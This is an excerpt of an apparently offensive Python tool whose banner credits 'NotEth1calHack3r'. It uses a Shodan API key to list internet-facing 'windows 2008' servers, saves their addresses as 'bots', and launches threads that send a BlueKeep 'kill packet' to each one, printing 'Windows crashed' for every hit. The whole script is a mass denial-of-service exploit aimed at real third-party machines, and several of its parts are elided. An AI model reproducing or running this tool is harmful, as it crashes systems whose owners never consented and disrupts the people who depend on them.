...
logo = '''
	...
	\033[1;37m╚███╔███╔╝██║██║ ╚████║╚██████╗██║  ██║██║  ██║███████║██║  ██║
	\033[1;31m ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
		       \033[1;31mCOded by: NotEth1calHack3r
                           \033[1;37mDISCLAMER
...
if keys.is_file():
	...
	file = open('api.txt', 'w')
	SHODAN_API_KEY = input('\033[1;37m[\033[1;31m*\033[1;37m]Please enter a valid Shodan.io API Key:\033[1;31m ')
	file.write(SHODAN_API_KEY)
	print('\033[1;37m[\033[1;31m*\033[1;37m]Api written')
file.close()
api = shodan.Shodan(SHODAN_API_KEY)
myresults = Path("bots.txt")
results = api.search('windows 2008')
print('\033[1;37m[\033[1;31m~\033[1;37m]Number of Windows servers in shodan:\033[1;31m %s' % results['total'])
results = api.search('windows 2008')
bots = Path('bots.txt')
if bots.is_file():
	os.remove('bots.txt')
...
ips = open('bots.txt', "r").readlines()
arch = input("\033[1;37m[\033[1;31m*\033[1;37m]Select arch 32/64: ")
...
class bluekeep(threading.Thread):
	...
	def run(self):
		try:
			...
			send_kill_packet(tls, arch)
			terminate_connection(tls)
			print("\033[1;37m[\033[1;31m*\033[1;37m]Windows crashed ^-^:\033[1;36m ", self.ip)
